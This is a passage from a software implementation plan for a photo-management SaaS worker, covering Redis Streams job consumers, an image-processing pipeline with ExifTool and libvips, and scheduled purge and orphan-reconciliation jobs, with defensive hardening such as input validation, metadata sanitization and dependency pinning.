**Step 3: Implement DeleteJobConsumer**

- `XREADGROUP` on `delete-jobs` stream using group `delete-processors`
- Parse all four message fields: `photo_id`, `original_key`, `thumbnail_sm`, `thumbnail_md`
- **Null-key guard (SA2-F5):** Before any MinIO call, validate that `original_key` is non-null and non-blank. If not, log at ERROR, XACK the message, and return — do not attempt MinIO deletion:
  ```java
  if (originalKey == null || originalKey.isBlank()) {
      log.error("delete-job received with null originalKey — XACK and skip, photo_id={}", photoId);
      redisCommands.xack(DELETE_JOBS_STREAM, CONSUMER_GROUP, messageId);
      return;
  }
  ```
  This prevents a cascading retry storm and dead-letter buildup if a malformed message enters the stream by any path.
- **Storage key format validation (SA3-F2):** After the null/blank guard, validate that all three keys match the expected UUID-based format before any MinIO call. A key that passes the null/blank check but has an unexpected structure (e.g., from a Redis-compromise injection) must not reach the MinIO client:
  ```java
  private static final Pattern STORAGE_KEY_PATTERN = Pattern.compile(
      "^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" +
      "/(originals|thumbnails)/" +
      "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}(_sm|_md)?\\.[a-z0-9]+$");

  private boolean isValidStorageKey(String key) {
      return key != null && STORAGE_KEY_PATTERN.matcher(key).matches();
  }
  ```
  Apply before each MinIO delete call. For `original_key`, reject and XACK if invalid. For `thumbnail_sm` and `thumbnail_md`, skip the individual MinIO call (they may be legitimately absent for photos that never completed thumbnail generation) but log at WARN:
  ```java
  if (!isValidStorageKey(originalKey)) {
      log.error("delete-job originalKey failed format validation — XACK and skip, " +
                "key={}, photo_id={}", originalKey, photoId);
      redisCommands.xack(DELETE_JOBS_STREAM, CONSUMER_GROUP, messageId);
      return;
  }
  // For thumbnails: skip individual key if format invalid; original already validated
  if (isValidStorageKey(thumbnailSm)) { /* delete thumbnailSm */ }
  else { log.warn("thumbnail_sm key invalid format — skipping, photo_id={}", photoId); }
  if (isValidStorageKey(thumbnailMd)) { /* delete thumbnailMd */ }
  else { log.warn("thumbnail_md key invalid format — skipping, photo_id={}", photoId); }
  ```
- Delete all three MinIO keys per message
- `XACK`

**Step 4: Implement XAUTOCLAIM recovery (scheduled every 5 min)**

- `min-idle-time` = `${worker.streams.claim-idle-time-ms:1800000}` (default 30 minutes)
- **Rationale:** 30 minutes safely exceeds the worst-case RAW processing time (Tika → libraw → libvips → metadata-extractor). A message idle longer than this indicates a hung or crashed worker — reclaiming it is correct. If the idle time were shorter than processing time, a slow but healthy worker would have its in-progress message stolen, causing duplicate concurrent processing.

**Step 5: Implement startup re-enqueue recovery**

- **Acquire distributed lock first:** `SET worker:startup-recovery-lock {instanceId} NX PX 300000` (5 minute TTL)
- Only the instance that acquires the lock performs the recovery scan
- Instances that do not acquire the lock skip recovery and log accordingly

- **Lock-refresh (page-refresh pattern with ownership verification):** After processing each batch, refresh the lock using a Lua script that atomically verifies ownership before extending TTL:
  ```lua
  -- refresh-lock.lua
  if redis.call("GET", KEYS[1]) == ARGV[1] then
    return redis.call("SET", KEYS[1], ARGV[1], "XX", "PX", ARGV[2])
  else
    return nil
  end
  ```
  Execute via Lettuce `sync().eval(script, ScriptOutputType.STATUS, keys, args)`. If the script returns `nil`, the instance has lost the lock (e.g., due to a GC pause exceeding the TTL during which another instance acquired the lock). **Abort recovery immediately** and log at ERROR. Do not continue scanning. This prevents two instances from concurrently executing recovery, which would re-enqueue the same photos twice and reset their delivery counters.

  **Why `SET XX` alone is insufficient:** `XX` checks that the key exists but not the current value. If the lock expires and a second instance acquires it before the first instance issues the refresh, the `XX` command still succeeds (key exists) and overwrites the second instance's value — both instances believe they hold the lock.

- **Idempotency — paginated PEL check before re-enqueue:** Before the DB scan begins, paginate the full PEL into a `Set<String>` to use as a deduplication filter:
  ```java
  Set<String> pelPhotoIds = new HashSet<>();
  String cursor = "-";
  List<PendingMessage> page;
  do {
      page = redisCommands.xpending(PHOTO_JOBS_STREAM, CONSUMER_GROUP,
          Range.create(cursor, "+"), 1000);
      for (PendingMessage msg : page) {
          pelPhotoIds.add(msg.getBody().get("photo_id"));
      }
      if (!page.isEmpty()) {
          cursor = page.get(page.size() - 1).getId().getValue();
      }
  } while (page.size() == 1000);
  ```
  Re-enqueue only photos whose `photo_id` is absent from `pelPhotoIds`. This prevents duplicate stream entries across restart cycles (which would reset the delivery counter and cause failed jobs to loop indefinitely).

  **Why COUNT 100 is insufficient:** A single `XPENDING ... COUNT 100` returns at most 100 entries. After a large-scale outage (>100 in-flight jobs), entries beyond position 100 are invisible. Photos at position 101+ appear absent from the PEL and are incorrectly re-enqueued. Paginating until the result set is empty guarantees full coverage regardless of PEL size.

- Lock holder: page through `'PENDING'`/`'PROCESSING'` rows where `deleted_at IS NULL`; for each batch, PEL-check then re-enqueue missing entries; refresh lock TTL after each batch using the Lua script above

**Step 6: Run tests, verify pass**

**Step 7: Commit**

```bash
git commit -m "feat: worker Redis Streams consumers with retry, dead-letter, and recovery"
```

---

### Task 3.5: Worker — Image Processing Pipeline

**Files:**
- Create: `worker/src/main/java/org/jphototagger/worker/pipeline/ImageProcessor.java`
- Create: `worker/src/main/java/org/jphototagger/worker/pipeline/TikaValidator.java`
- Create: `worker/src/main/java/org/jphototagger/worker/pipeline/ThumbnailGenerator.java`
- Create: `worker/src/main/java/org/jphototagger/worker/pipeline/MetadataExtractor.java`

**Java dependency pinning (SA2-F3):**

Pin all Java libraries that process user-uploaded content to exact versions for reproducible builds and CVE auditability. Verify against Maven Central for the current stable release at implementation time.

```groovy
// api/build.gradle and worker/build.gradle
implementation 'org.apache.tika:tika-core:2.9.2'            // pin; verify latest stable
implementation 'com.drewnoakes:metadata-extractor:2.19.0'   // pin; verify latest stable
implementation 'org.jsoup:jsoup:1.18.3'                     // pin; verify latest stable
implementation 'io.minio:minio:8.5.12'                      // pin; verify latest stable
```

Rationale: Tika processes file magic bytes, metadata-extractor parses full binary EXIF/IPTC/XMP content, and Jsoup performs sanitization — all handling user-controlled data. Unpinned versions are non-reproducible and cannot be audited against CVE databases. Note: ShedLock is already correctly pinned to `6.0.2`; this pattern is consistent with that.

**Trivy scan scope (extend existing CI scan):** Extend the Trivy scan added in SA-1 to cover JARs in the build output via SBOM scanning:

```bash
trivy fs --scanners vuln --format sarif --output trivy-results.sarif .
```

This detects CVEs in all installed JARs, not just the Docker image OS packages.

---

**Worker Dockerfile — dependency pinning:**

Pin all native library versions to exact apt versions at implementation time. Do not use unpinned `apt-get install` — non-reproducible builds cannot be audited for CVEs.

```dockerfile
# Pin FROM image to specific digest for reproducible builds
FROM debian:bookworm-slim@sha256:<digest-at-implementation-time>

# Verify versions against security tracker before pinning
RUN apt-get update && apt-get install -y --no-install-recommends \
    libraw-dev=X.Y.Z \
    libvips-tools=X.Y.Z \
    libimage-exiftool-perl=X.Y.Z \
    && rm -rf /var/lib/apt/lists/*
```

**ExifTool version requirement:** `libimage-exiftool-perl` **must be ≥ 12.24**. CVE-2021-22204 (ExifTool ≤ 12.23) is a confirmed RCE exploitable via a crafted DjVu file with malicious metadata — it is listed in the CISA Known Exploited Vulnerabilities catalogue. An authenticated user uploading a crafted file can achieve arbitrary code execution in the worker container. Debian 12 (Bookworm) ships 12.57+; verify the available apt version satisfies ≥ 12.24 before pinning.

**CI scan:** Add a Trivy scan of the built worker Docker image to CI. The scan must fail the build on any CVE ≥ HIGH in installed packages. This guards against ExifTool, libraw, and libvips CVEs being silently introduced by future image rebuilds.

**Step 1: Write failing tests**

```java
@Test
void tikaValidator_rejectsNonImageFile() {
    // assert ProcessingException thrown for non-image MIME type
}

@Test
void tikaValidator_acceptsJpeg() {
    // assert no exception for image/jpeg
}

@Test
void thumbnailGenerator_createsSmAndMdThumbnails() {
    // assert two thumbnail objects uploaded to MinIO with _sm and _md suffixes
}

@Test
void thumbnailGenerator_failsCleanlyOnProcessTimeout() {
    // assert ProcessTimeoutException thrown and process destroyed when tool exceeds timeout
}

@Test
void metadataExtractor_extractsExifData() {
    // assert photo_metadata row contains expected EXIF fields from test fixture
}

@Test
void metadataExtractor_upsertSucceedsOnReprocessing() {
    // assert no exception when photo_metadata row already exists; row is updated not duplicated
}

@Test
void metadataExtractor_stripsHtmlTagsFromIptcCaption() {
    // assert caption stored in DB contains no HTML tags when IPTC contains injected markup
}

@Test
void metadataExtractor_stripsHtmlTagsFromIptcTitle() {
    // assert title stored in DB contains no HTML tags when IPTC contains injected markup
}

@Test
void metadataExtractor_stripsHtmlTagsFromIptcDescription() {
    // assert description stored in DB contains no HTML tags when IPTC contains injected markup
}

@Test
void metadataExtractor_stripsHtmlTagsFromExifUserComment() {
    // assert exif_data.UserComment stored in DB contains no HTML tags (e.g. "<script>" → stripped)
    // when EXIF UserComment field contains injected markup (SA2-F1)
}

@Test
void metadataExtractor_capturesExifToolOutputForLargeExifPhoto() {
    // assert photo fixture with 100 KB XMP block produces correct metadata (not timeout/FAILED)
    // verifies ExifTool stdout is consumed via redirect-to-file before waitFor() (SA2-F2)
}

@Test
void metadataExtractor_handlesNullExifValues() {
    // assert that a raw EXIF map containing a null-valued entry is sanitized without NPE;
    // null values pass through as null in sanitizedExifData
}
```

**Step 2: Implement TikaValidator**

Apache Tika content-type check. Reject non-image files before any processing.

**Step 3: Implement ThumbnailGenerator**

- Download original from MinIO to tmpfs (`/tmp` — see docker-compose tmpfs note below)
- **Temp file cleanup:** Wrap the file lifecycle in try-finally to guarantee cleanup on both success and failure paths:
  ```java
  Path tmp = Files.createTempFile(Path.of("/tmp"), photoId.toString(), "." + ext);
  try {
      // download, process
  } finally {
      Files.deleteIfExists(tmp);
  }
  ```
- For RAW: `libraw` CLI via ProcessBuilder (extract embedded JPEG)
- `libvips` CLI via ProcessBuilder (resize to sm/md thumbnails)
- Upload thumbnails to MinIO
- All CLI calls use explicit argument arrays — never shell strings
- Files referenced by UUID storage keys only
- **ProcessBuilder timeout:** All tool invocations use `process.waitFor(5, TimeUnit.MINUTES)`. On timeout: call `process.destroyForcibly()`, throw `ProcessTimeoutException`. The exception propagates to `PhotoJobConsumer` which applies the retry/dead-letter policy. Per-tool timeout is configurable via `worker.process.timeout-minutes: 5`.
- **tmpfs sizing (docker-compose.yml):** The worker service must declare:
  ```yaml
  tmpfs:
    - /tmp:size=${WORKER_TMPFS_SIZE:-1g},mode=1777
  ```
  Rationale: single-threaded consumer; 1 job × 120 MB RAW = 120 MB needed; 1 GB provides ample headroom for concurrent temp file accumulation during processing. The `${WORKER_TMPFS_SIZE:-1g}` variable is defined in `.env.example` (see Task 3.2 Step 4) — operators tune this without modifying `docker-compose.yml`.

  **Note:** Update `docs/plans/2026-02-24-saas-conversion-design.md` Section 7 worker service tmpfs from `- /tmp:size=512M` to `- /tmp:size=${WORKER_TMPFS_SIZE:-1g},mode=1777`. The design doc is the deployment source of truth and must stay consistent with the plan.

**Step 4: Implement MetadataExtractor**

- `metadata-extractor` (Java) as primary
- ExifTool `-fast2` as fallback via ProcessBuilder — **stdout must be consumed before `waitFor()` to prevent pipe buffer exhaustion (SA2-F2).** Use redirect-to-temp-file (Option A — simpler than async threading, no extra thread required):

  ```java
  File outputFile = File.createTempFile("exiftool-", ".json", new File("/tmp"));
  try {
      ProcessBuilder pb = new ProcessBuilder(
          "exiftool", "-fast2", "-json", tmpFile.toString());
      pb.redirectOutput(outputFile);
      pb.redirectError(ProcessBuilder.Redirect.DISCARD);
      Process process = pb.start();
      boolean completed = process.waitFor(
          workerProperties.getProcess().getTimeoutMinutes(), TimeUnit.MINUTES);
      if (!completed) {
          process.destroyForcibly();
          throw new ProcessTimeoutException("ExifTool timed out for photo " + photoId);
      }
      String json = Files.readString(outputFile.toPath());
      // parse json → extract metadata fields
  } finally {
      try {
          Files.deleteIfExists(outputFile.toPath());
      } catch (IOException e) {
          log.error("Failed to delete ExifTool temp file: {}", outputFile, e);
      }
  }
  ```

  **Why explicit `/tmp` directory:** `File.createTempFile(prefix, suffix)` uses `java.io.tmpdir`, which is not guaranteed to be the tmpfs mount if overridden. The three-argument form `File.createTempFile(prefix, suffix, new File("/tmp"))` is explicit, consistent with the `Path.of("/tmp")` pattern used in `ThumbnailGenerator`.

  **Why `Files.deleteIfExists()` over `File.delete()`:** `File.delete()` returns `false` silently on failure. `Files.deleteIfExists()` throws a checked `IOException` that we catch and log at ERROR, surfacing filesystem issues (permissions, stale handles) that would otherwise be invisible.

  **Why redirect-to-file:** Linux's default pipe buffer is 64 KB. ExifTool writes its JSON output to stdout. For photos with large XMP blocks or extensive RAW GPS data, output can reach 100–300 KB. Without consuming stdout before `waitFor()`, ExifTool blocks on the pipe write and `waitFor()` times out after 5 minutes — producing a permanent `FAILED` status with no meaningful error. Redirect-to-file (`pb.redirectOutput(outputFile)`) drains stdout into a file so ExifTool never blocks. libvips and libraw write to explicit output files (not stdout) and do not have this issue.
- **Sanitize ALL EXIF/IPTC/XMP text fields before DB write (SA2-F1).** Apply `Jsoup.parse(v).text()` to every string-typed value in the raw EXIF map before assembling the JSONB payload, in addition to the per-field sanitization of `caption`, `title`, and `description`:

  ```java
  // Step 1: sanitize all string values in the raw EXIF map before JSONB assembly.
  // HashMap.put() accepts null values; Collectors.toMap() calls HashMap.merge() which
  // calls Objects.requireNonNull(value) — NPE on any null-valued EXIF tag.
  Map<String, Object> sanitizedExifData = new HashMap<>();
  rawExifData.forEach((k, v) ->
      sanitizedExifData.put(k, v instanceof String s ? Jsoup.parse(s).text() : v));

  // Step 2: extract and sanitize the three named fields for the photos table.
  // sanitize() guards against null — Jsoup.parse(null) throws NPE; these fields
  // are absent from most photos.
  String safeCaption = sanitize(rawCaption);
  String safeTitle   = sanitize(rawTitle);
  String safeDesc    = sanitize(rawDescription);
  ```

  Define `sanitize()` as a private helper in `MetadataExtractor`:
  ```java
  private String sanitize(String s) {
      return s != null ? Jsoup.parse(s).text() : null;
  }
  ```

  **Why sanitize the full JSONB map:** The three named fields (`caption`, `title`, `description`) are rendered in prominent UI locations — they were sanitized first. However, `photo_metadata.exif_data` stores the complete EXIF/IPTC/XMP dataset, including string fields such as `UserComment`, `ImageDescription`, `Artist`, `Copyright`, `XMP:Description`, `XMP:Rights`, `IPTC:Keywords`, and `GPS:GPSAreaInformation`. Phase 4 renders these fields in the metadata panel. Sanitizing at write time (Phase 3) is strictly cheaper than auditing every UI component that renders EXIF data (Phase 4).

  **Do not use `Jsoup.clean(rawValue, Safelist.none())`** — that method HTML-encodes entities, so `&` becomes `&amp;` in the stored value, corrupting legitimate metadata. `.text()` returns decoded plain text.

  **Phase 4 note:** See Phase 4 Task 4.6 for the safe EXIF rendering requirement — all `exif_data` JSONB fields must be rendered via React text nodes only; never `dangerouslySetInnerHTML`.

- Write extracted EXIF/IPTC/XMP to `photo_metadata` table as JSONB using **upsert** (using `sanitizedExifData`):
  ```sql
  INSERT INTO photo_metadata (photo_id, exif_data, extracted_at)
  VALUES (?, ?, now())
  ON CONFLICT (photo_id) DO UPDATE SET
      exif_data = EXCLUDED.exif_data,
      extracted_at = EXCLUDED.extracted_at;
  ```
  This ensures re-processed photos (after a failed first run) overwrite partial metadata without PK violations.
- Populate `caption`, `title`, `description` on `photos` from IPTC/XMP (sanitized values only)

**Step 5: Wire into ImageProcessor pipeline**

Define `ProcessingException` (unchecked) as the base failure signal in the worker module. `ProcessTimeoutException` extends it. `PhotoJobConsumer` catches `ProcessingException` as the trigger for the retry/dead-letter policy.

Branching pipeline logic:
```
Tika → validate MIME type
if (mimeType is RAW format — e.g., image/x-canon-cr2, image/x-nikon-nef, image/x-sony-arw, image/x-adobe-dng):
    libraw → extract embedded JPEG
libvips → resize to sm/md thumbnails
metadata-extractor → extract EXIF/IPTC/XMP
ExifTool fallback → if metadata-extractor yields insufficient data
update DB
```

Define the complete set of RAW MIME types that trigger the libraw path at implementation time (check Tika's MediaType registry for the full list). Keep this list consistent with the MIME-to-extension allowlist defined in Task 3.2.

**Retry reprocessing:** Pipeline steps are not individually idempotent-guarded. On retry, all steps re-execute. MinIO PUT overwrites are idempotent; DB upsert on `photo_metadata` is idempotent. Full reprocessing on retry is accepted behavior for Phase 3.

**Step 6: Run tests, verify pass**

**Step 7: Commit**

```bash
git commit -m "feat: worker image processing pipeline — Tika, libraw, libvips, metadata"
```

---

### Task 3.6: Worker — Scheduled Tasks

**Files:**
- Create: `api/src/main/java/org/jphototagger/api/scheduler/TrashPurgeScheduler.java`
- Create: `api/src/main/java/org/jphototagger/api/scheduler/OrphanReconciliationScheduler.java`
- Create: `api/src/main/java/org/jphototagger/api/scheduler/UnverifiedAccountPurgeScheduler.java`

**ShedLock dependency (add to `api/build.gradle`):**
```groovy
implementation 'net.javacrumbs.shedlock:shedlock-spring:6.0.2'
implementation 'net.javacrumbs.shedlock:shedlock-provider-redis-spring:6.0.2'
```
Pin to an exact version. Check Maven Central for the current stable `6.x` release at implementation time and update accordingly. Do not use wildcard versions (`6.x`) — builds must be reproducible.

All three schedulers are annotated with `@SchedulerLock` to prevent concurrent execution across API instances (rolling deploys, horizontal scale). This is the primary guard against duplicate purge operations.

**Step 1: Write failing tests**

```java
@Test
void trashPurge_deletesPhotosOlderThanRetentionWindow() {
    // assert photos with deleted_at < now() - retention-days are removed
}

@Test
void trashPurge_enqueuesMinioDeleteJob() {
    // assert delete-job enqueued in Redis for each purged photo with all four message fields
}

@Test
void trashPurge_doesNotRunConcurrentlyAcrossInstances() {
    // assert ShedLock prevents second scheduler execution while first holds lock
}

@Test
void orphanReconciliation_detectsOrphanedMinioObjects() {
    // assert MinIO objects with no matching photos row are enqueued for deletion
}

@Test
void orphanReconciliation_doesNotDeleteObjectWherePhotoRowExists() {
    // assert MinIO object is not enqueued for deletion when a photos row exists for its photo_id,
    // regardless of storage_key or deleted_at state (covers in-progress uploads, active, soft-deleted)
}

@Test
void unverifiedPurge_deletesAccountsOlderThan7Days() {
    // assert users with email_verified=false and created_at < now() - 7 days are deleted
}

@Test
void unverifiedPurge_keepsVerifiedAccounts() {
    // assert users with email_verified=true are not deleted regardless of age
}

@Test
void unverifiedPurge_enqueuesMinioDeletesBeforeDeletingDbRecords() {
    // assert delete-jobs are present in Redis before photo rows are removed from DB
}
```

**Step 2: Implement TrashPurgeScheduler**

- `@Scheduled(cron = "0 0 3 * * *")` — daily at 3 AM
- `@SchedulerLock(name = "trashPurge", lockAtMostFor = "PT10M", lockAtLeastFor = "PT1M")`
- Retention window from `@Value("${jpt.trash.retention-days:30}")` in `api/src/main/resources/application.yml` — per-user configurability is out of scope for Phase 3
- Delete photos where `deleted_at < now() - (retentionDays || ' days')::interval`
- **Page through purged photos in batches of 500** to avoid loading all into heap (OOM risk for large trash windows). Always query page 0 — advancing the offset after deleting rows causes offset-skipping (after deleting rows 0–499, OFFSET 500 skips what are now rows 0–499):
  ```java
  Pageable page = PageRequest.of(0, 500);   // always page 0
  List<Photo> batch;
  do {
      batch = photoRepo.findPurgeableBatch(cutoff, page);
      if (batch.isEmpty()) break;
      enqueueDeleteJobsBatch(batch); // Lettuce pipeline per batch
      deletePhotosBatch(batch);
      // do NOT advance page — deleted rows are gone; next query of page 0 returns next 500
  } while (!batch.isEmpty());
  ```
  Repository method returns `List<Photo>` (not `Slice<Photo>`) with `LIMIT 500`. The loop terminates when a batch is empty.

  **Note:** At implementation time, verify `UnverifiedAccountPurgeScheduler` does not use the same advancing-offset pattern if it paginates photo or user batches.
- **Null `storage_key` cleanup (compensating-Tx recovery):** Also query for photo rows where `storage_key IS NULL AND deleted_at IS NULL AND created_at < now() - INTERVAL '1 hour'` — these are upload compensating-Tx failures where the DB rollback itself failed.

  For each batch:
  1. **(No delete-job enqueue — SA2-F5.)** `storage_key` is unknown for these rows (the upload failed before MinIO completed or before Tx 2 committed). Any MinIO objects that do exist for these uploads are true orphans and are handled by `OrphanReconciliationScheduler` on its scheduled run. Enqueueing a delete-job with null/empty object keys would cause `DeleteJobConsumer` to crash or dead-letter on every retry.
  2. Execute a single SQL CTE that atomically deletes the rows and decrements `used_bytes`:
     ```sql
     WITH deleted AS (
         DELETE FROM photos
         WHERE storage_key IS NULL
         AND deleted_at IS NULL
         AND created_at < now() - INTERVAL '1 hour'
         RETURNING user_id, COALESCE(file_size, 0) AS file_size
     )
     UPDATE users u
     SET used_bytes = GREATEST(0, u.used_bytes - d.file_size)
     FROM deleted d
     WHERE u.id = d.user_id;
     ```
  `GREATEST(0, ...)` prevents negative `used_bytes` if `file_size` is inconsistent. The CTE is the correct approach — a `@Transactional` wrapper on a method called from within the same class is silently ignored by Spring's proxy-based AOP (self-invocation bypasses the proxy). The CTE guarantees atomicity at the database level with no Spring proxy dependency.

  **`file_size` note:** `file_size` is populated in Tx 1 of the upload (before MinIO upload) because quota validation requires it. Use `COALESCE(file_size, 0)` as a safe fallback for any rows where it is unexpectedly null.

- Cascade deletes `photo_keywords`, `album_photos`, `shares`

**Step 3: Implement OrphanReconciliationScheduler**

- `@Scheduled(cron = "0 0 4 * * SUN")` — weekly
- `@SchedulerLock(name = "orphanReconciliation", lockAtMostFor = "PT2H", lockAtLeastFor = "PT5M")`
- **To avoid OOM, stream all sides:**
  - User IDs: `SELECT id FROM users` returning `Stream<UUID>`, `@Transactional(readOnly = true)`, consumed inside a try-with-resources block
  - MinIO side: for each user ID, iterate by prefix (`{user_id}/`) using paginated `listObjects` — never load all objects at once

- **Orphan identification — photo_id existence check (not storage_key comparison):**

  For each MinIO object key under `{user_id}/`:
  1. **Skip non-originals paths immediately:** if the key does not start with `{user_id}/originals/`, skip it and continue. Thumbnail paths (`{user_id}/thumbnails/{photo_id}_sm.jpg`) contain `{photo_id}_sm` which is not a valid UUID — attempting to parse them throws an exception and produces log noise on every reconciliation run.
  2. Parse `photo_id` from the key (the UUID is embedded between the last `/` and the `.{ext}`)
  3. Execute: `SELECT EXISTS(SELECT 1 FROM photos WHERE id = :photo_id)`
  4. If EXISTS → **skip** — a DB row owns this object regardless of its state (in-progress, active, soft-deleted). The normal deletion pipeline handles soft-deleted objects via delete-jobs.
  5. If NOT EXISTS → true orphan → construct all keys from `photo_id` and enqueue delete-job with all four fields:
     ```
     original_key = "{user_id}/originals/{photo_id}.{ext}"   // parsed from the MinIO key
     thumbnail_sm = "{user_id}/thumbnails/{photo_id}_sm.jpg"  // derived deterministically
     thumbnail_md = "{user_id}/thumbnails/{photo_id}_md.jpg"  // derived deterministically
     ```
     Thumbnail keys may not exist in MinIO (if the worker crashed before generating them) — `DeleteJobConsumer` handles missing keys gracefully via the MinIO SDK's no-op on non-existent object deletion.

  **Why this eliminates the TOCTOU race:** The upload transaction order guarantees a DB row is inserted (Tx 1) before any MinIO object is created. Therefore, any MinIO object that exists must have a corresponding DB row — unless the upload failed before Tx 1 committed (the only true orphan case). There is no timing window: checking row existence by `photo_id` (embedded in the key by design) exploits the plan's own structural invariant.

  **Why the previous storage_key approach was wrong:** Querying `SELECT storage_key FROM photos WHERE user_id = :userId AND deleted_at IS NULL` returns NULL for in-progress uploads (Tx 1 committed, Tx 2 not yet). A NULL storage_key never matches a MinIO object key, so the object appears unreferenced and gets incorrectly enqueued for deletion during the upload window (up to 30 seconds for large RAW files on slow connections).

**Step 4: Implement UnverifiedAccountPurgeScheduler**

- `@Scheduled(cron = "0 30 3 * * *")` — daily at 3:30 AM (after trash purge)
- `@SchedulerLock(name = "unverifiedAccountPurge", lockAtMostFor = "PT10M", lockAtLeastFor = "PT1M")`
- Delete users where `email_verified = false` AND `created_at < now() - INTERVAL '7 days'`
- **Strict deletion order to prevent permanent orphans:**
  1. Query `storage_key` values for all photos belonging to the user
  2. Enqueue MinIO delete-jobs (pipeline) — jobs are in Redis before any DB row is removed
  3. Delete DB records (cascade: photos, keywords, albums, saved searches)
  - If the service crashes between steps 2 and 3, delete-jobs are already queued and MinIO cleanup completes on the next worker cycle. The DB rows still exist and will be caught on the next purge run.
- Uses the `authDataSource` (BYPASSRLS) since unverified user cleanup must access the users table directly
- Implements design doc requirement (v4.0, [CR#5]): "unverified accounts soft-gated (no uploads) with 7-day auto-purge"

**Step 5: Run tests, verify pass**

**Step 6: Commit**

```bash
git commit -m "feat: scheduled tasks — trash purge, orphan reconciliation, unverified account purge"
```

---

**Next Phase:** [Phase 4: React Frontend](2026-02-25-saas-conversion-phase-4.md)
